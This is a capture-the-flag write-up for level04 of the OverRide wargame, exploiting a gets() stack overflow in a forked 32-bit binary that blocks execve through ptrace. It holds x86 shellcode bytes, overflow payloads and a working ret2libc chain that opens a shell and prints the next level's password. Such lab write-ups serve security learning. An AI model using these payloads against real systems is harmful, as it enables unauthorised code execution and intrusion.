# level04

### First analysis

Let's as always anaylse first the checksec, then the code of this binary, which is a 32bit ELF binary LSC executable:

```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

So a very not secured binary, no canary, NX disabed, no PIE, and only PARTIAL RELRO, so we can do almost everything we want in terms of overflow if we need one. Now the code:

```c
int main(void) {
    int     status;
    int     tracer;
    char    buffer[128];
    __pid_t pid;

    pid = fork();
    status = 0;
    tracer = 0;
    memset(buffer, 0, sizeof(buffer));

    if (!pid) {
        prctl(PR_SET_PDEATHSIG, 1);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(buffer);
    }
    else {
        do {
            wait(&status);
            if (WIFEXITED(status) || WIFSIGNALED(status)) {
                puts("child is exiting...");
                return 0;
            }

            tracer = ptrace(PTRACE_PEEKUSER, pid, 44, 0);
        } while (tracer != 11);     // 11 = execve syscall number (x86)

        puts("no exec() for you");
        kill(pid, SIGKILL);
    }

    return 0;
}
```

Again pretty easy to understand, even if this program uses functions we don't use that often since it uses parallelization with fork() function.So we have a buffer of 128 chars, and it is gonna be used in a gets() function, that we know is very weak since we can enter as many chars as we want. So overflow are possible. In the child process (pid == 0) we have a user input, the gets we were talking about a prctl and a ptrace. In the parent process we have an infinite loop that checks if the result of ptrace = 11, if it's the case the program kill the child process and leave. 11 being the syscall number in x86 for execve function. In the other case if the program detects that the child process is finished, that gets returned correctly, then the program leave properly.

After testing all the size of buffer possible, we notices that 156 chars is a limit where weird phenomenons happen, under 156 the program seems to work normally, at 156 precisely the program restart itself again and again we can interact with gets again, and over 156 the program seems stuck in an infinite loop, with no exit message, nothing.

### Solution

Now that we know that there is a segfault possible, and an overflow too, we have 2 methods to test, the env variable shellcode, and the ret2libc method that we tested earlier and explained it [here](https://github.com/kbarbry/OverRide/tree/main/level01). Let's first try to follow the child process and know where exactly the program crash:

```sh
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 1898]
Give me some shellcode, k
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1898]
0x6e6e6e6e in ?? ()
```

We now know that we can follow the child process with set follow-fork-mode child command. We also confirm that if we want to redirect the program to a shellcode it will be with a padding of 156. (6e = n) So now let's try the first method which is the env variable shellcode:

```sh
level04@OverRide:~$ export SHELLCODE=$(python -c "print('\x90' * 500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
level04@OverRide:/tmp$ gcc -m32 -o env source.c
level04@OverRide:/tmp$ ./env SHELLCODE
Searching address of SHELLCODE env variable:
Big-endian format: 0xffffd711
Lil-endian format: \x11\xd7\xff\xff
level04@OverRide:~$ python -c "print('A' * 156 + '\x11\xd7\xff\xff')" > /tmp/payload
level04@OverRide:~$ cat /tmp/payload - | ./level04
Give me some shellcode, k
no exec() for you
```

This method doesn't work and apparently it triggers the ptrace signal, and send the message "no exec() for you". So indeed the shellcode was executed, and was detected, then the child process was killed. This method uses a syscall exec so that make sense. Maybe we will have more chance with the ret2libc method, again more details are available [here](https://github.com/kbarbry/OverRide/tree/main/level01) cause we are gonna go very fast here:

```sh
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system              ## system address   0xf7e6aed0
0xf7f48a50  svcerr_systemerr
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit                ## exit address     0xf7e5eb70
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit

(gdb) info proc map
[...]
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
[...]
level04@OverRide:~$ strings -t x /lib32/libc-2.15.so | grep "/bin/sh"
 15d7ec /bin/sh                 ## "/bin/sh" address 0xf7e2c000 + 15d7ec = 0xf7f897ec

level04@OverRide:~$ (python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

## Important doc
